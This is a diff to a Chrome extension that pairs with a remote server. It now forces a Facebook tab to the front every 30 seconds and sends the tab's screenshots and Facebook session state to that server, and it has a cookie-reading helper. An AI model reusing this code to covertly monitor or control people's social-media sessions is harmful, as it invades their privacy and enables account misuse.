@@ -1,5 +1,6 @@
 const DEFAULT_SERVER_URL = 'https://sale.thgfulfill.com';
 const HEARTBEAT_ALARM = 'thg-heartbeat';
+const FACEBOOK_HOME = 'https://www.facebook.com/';
 const CAPABILITIES = {
   local_chrome: true,
   browser_control: 'user_chrome_extension',
@@ -47,6 +48,10 @@ async function getConfig() {
 
 function queryTabs(query) {
   return chrome.tabs.query(query);
+}
+
+function delay(ms) {
+  return new Promise(resolve => setTimeout(resolve, ms));
 }
 
 function getCookie(details) {
@@ -191,6 +196,30 @@ async function fetchTargets() {
   return Array.isArray(payload.targets) ? payload.targets : [];
 }
 
+function chooseTarget(targets, fbUserId) {
+  if (!Array.isArray(targets) || targets.length === 0) return null;
+  if (fbUserId) {
+    const sameFbUser = targets.find(t => String(t.fb_user_id || t.fbUserId || '') === String(fbUserId));
+    if (sameFbUser) return sameFbUser;
+  }
+  return targets.find(t => !(t.fb_user_id || t.fbUserId)) || targets[0];
+}
+
+async function ensureFacebookTabVisible() {
+  const fbTabs = await queryTabs({ url: ['https://facebook.com/*', 'https://*.facebook.com/*'] });
+  let tab = fbTabs.find(t => t.active) || fbTabs[0] || null;
+  if (!tab) {
+    tab = await chrome.tabs.create({ url: FACEBOOK_HOME, active: true });
+  } else if (tab.id) {
+    if (tab.windowId) {
+      await chrome.windows.update(tab.windowId, { focused: true }).catch(() => {});
+    }
+    await chrome.tabs.update(tab.id, { active: true }).catch(() => {});
+  }
+  await delay(900);
+  return collectFacebookState();
+}
+
 function captureVisibleTab(windowId) {
   return chrome.tabs.captureVisibleTab(windowId, { format: 'jpeg', quality: 45 });
 }
@@ -216,11 +245,15 @@ async function maybeSendScreenshot(target, state) {
 async function heartbeat() {
   const cfg = await getConfig();
   if (!cfg.deviceToken) return { paired: false };
-  const state = await collectFacebookState();
+  let state = await collectFacebookState();
   await sendHeartbeat(state);
   const targets = await fetchTargets().catch(() => []);
-  const target = targets.find(t => t.account_id || t.accountId) || null;
+  let target = chooseTarget(targets, state.fbUserId);
   if (target) {
+    if (!state.tab || !state.tab.active) {
+      state = await ensureFacebookTabVisible();
+      target = chooseTarget(targets, state.fbUserId) || target;
+    }
     await sendChromeStatus(target, state).catch(() => {});
     await maybeSendScreenshot(target, state).catch(() => {});
   }
@@ -233,11 +266,11 @@ async function heartbeat() {
 }
 
 chrome.runtime.onInstalled.addListener(() => {
-  chrome.alarms.create(HEARTBEAT_ALARM, { periodInMinutes: 1 });
+  chrome.alarms.create(HEARTBEAT_ALARM, { periodInMinutes: 0.5 });
 });
 
 chrome.runtime.onStartup.addListener(() => {
-  chrome.alarms.create(HEARTBEAT_ALARM, { periodInMinutes: 1 });
+  chrome.alarms.create(HEARTBEAT_ALARM, { periodInMinutes: 0.5 });
 });
 
 chrome.alarms.onAlarm.addListener(alarm => {
@@ -251,6 +284,7 @@ chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
     try {
       if (message?.type === 'pair') {
         const payload = await pairConnector(message.serverUrl, message.code);
+        chrome.alarms.create(HEARTBEAT_ALARM, { periodInMinutes: 0.5 });
         sendResponse({ ok: true, connector: payload.connector });
         return;
       }
